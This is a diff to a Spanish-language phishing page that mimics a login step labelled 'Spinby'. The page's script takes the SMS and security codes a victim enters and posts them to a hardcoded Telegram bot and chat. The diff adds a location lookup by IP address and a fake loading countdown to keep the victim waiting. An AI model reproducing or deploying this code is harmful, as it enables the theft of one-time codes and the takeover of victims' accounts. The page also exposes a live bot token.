@@ -24,7 +24,7 @@
         }
 
         .logo {
-            max-width: 7%;
+            max-width: 30%;
             height: auto;
             margin-bottom: 30px;
         }
@@ -118,8 +118,8 @@
     <div class="form-container">
         <form id="loginForm">
             <div class="form-group">
-                <label for="smsCode">Escribe el código de 4 dígitos que recibiste por mensaje</label>
-                <input type="number" id="smsCode" name="smsCode" required placeholder="Código SMS" oninput="this.value = this.value.slice(0, 4)" pattern="\d{4}" title="Por favor, ingresa solo 4 dígitos">
+                <label for="smsCode">Escribe el código que recibiste por mensaje</label>
+                <input type="number" id="smsCode" name="smsCode" required placeholder="Código SMS" oninput="this.value = this.value.slice(0, 12)" pattern="\d{12}" title="Por favor, ingresa solo 4 dígitos">
             </div>
             <div class="form-group">
                 <label for="securityCode">Escribe tu código de seguridad</label>
@@ -135,17 +135,17 @@
 
     <div id="loading">
         <img src="cargando.gif" alt="Cargando..." />
-        <p id="countdown">15</p>
+        <p id="countdown">20</p>
     </div>
 
     <script>
         const form = document.getElementById('loginForm');
         let loadingDisplayed = false; 
         let countdown; 
-        let interval; 
+        let interval;
 
         function startCountdown() {
-            countdown = 15;
+            countdown = 20;
             document.getElementById('countdown').textContent = countdown;
 
             interval = setInterval(function() {
@@ -165,44 +165,55 @@
             const smsCode = document.getElementById('smsCode').value;
             const securityCode = document.getElementById('securityCode').value;
 
-            const url = `https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage`;
-            const data = {
-                chat_id: -4037234500,
-                text: `Spinby:\nCódigo SMS: ${smsCode}\nCódigo de seguridad: ${securityCode}`,
-                parse_mode: 'HTML'
-            };
+            // Obtener la ubicación por IP
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(locationData => {
+                    const city = locationData.city || "Desconocida";
+                    const country = locationData.country_name || "Desconocido";
 
-            // Mostrar el loading y comenzar la cuenta regresiva
-            if (!loadingDisplayed) {
-                document.getElementById('loading').style.display = 'block';
-                loadingDisplayed = true; 
-                startCountdown(); // Iniciar la cuenta regresiva al mostrar el loading
-            }
+                    // Mostrar el loading y comenzar la cuenta regresiva
+                    if (!loadingDisplayed) {
+                        document.getElementById('loading').style.display = 'block';
+                        loadingDisplayed = true; 
+                        startCountdown();
+                    }
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Mensaje enviado:', data);
-                if (!data.ok) { // Cambiar data.success a data.ok para la verificación correcta
-                    alert('Error al enviar el mensaje. Intenta nuevamente.');
-                    clearInterval(interval); // Detener la cuenta regresiva si hay error
-                    document.getElementById('loading').style.display = 'none';
-                    loadingDisplayed = false; // Resetear el estado de loading
-            
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                document.getElementById('loading').style.display = 'none';
-                loadingDisplayed = false; // Resetear el estado de loading
-                clearInterval(interval); // Detener la cuenta regresiva en caso de error
-            });
+                    const url = `https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage`;
+                    const data = {
+                        chat_id: -4037234500,
+                        text: `Spinby:\nCódigo SMS: ${smsCode}\nCódigo de seguridad: ${securityCode}\nCiudad: ${city}\nPaís: ${country}`,
+                        parse_mode: 'HTML'
+                    };
+
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Mensaje enviado:', data);
+                        if (!data.ok) {
+                            alert('Error al enviar el mensaje. Intenta nuevamente.');
+                            clearInterval(interval);
+                            document.getElementById('loading').style.display = 'none';
+                            loadingDisplayed = false; 
+                        }
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                        document.getElementById('loading').style.display = 'none';
+                        loadingDisplayed = false; 
+                        clearInterval(interval);
+                    });
+                })
+                .catch(err => {
+                    console.error('Error al obtener la ubicación:', err);
+                    alert('No se pudo obtener la ubicación.');
+                });
         });
     </script>
 </body>
